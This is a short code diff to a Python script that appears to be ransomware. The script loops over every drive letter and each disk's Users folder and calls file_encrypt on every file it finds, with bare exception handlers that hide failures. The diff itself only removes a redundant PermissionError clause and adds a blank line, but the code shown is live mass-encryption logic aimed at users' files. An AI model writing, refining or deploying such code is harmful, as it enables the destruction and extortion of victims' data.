@@ -99,8 +99,6 @@ while True:
                                 try:
                                     full_path = os.path.join(root, file)
                                     file_encrypt(key, full_path)
-                                except PermissionError:
-                                    pass
                                 except:
                                     pass
                                 
@@ -108,6 +106,7 @@ while True:
     for letter in all_drives:
         if os.path.isdir(letter + ':\\'):
             drives.append(letter + ":")
+            
     # ADD PATH TO ENCRYPT OF EVERY DISK INTO THE SYSTEM
     for drive in drives:
         rep = ["{}\\Users\\".format(drive)]
@@ -123,7 +122,5 @@ while True:
                                     try:
                                         full_path = os.path.join(root, file)
                                         file_encrypt(key, full_path)
-                                    except PermissionError:
-                                        pass
                                     except:
                                         pass
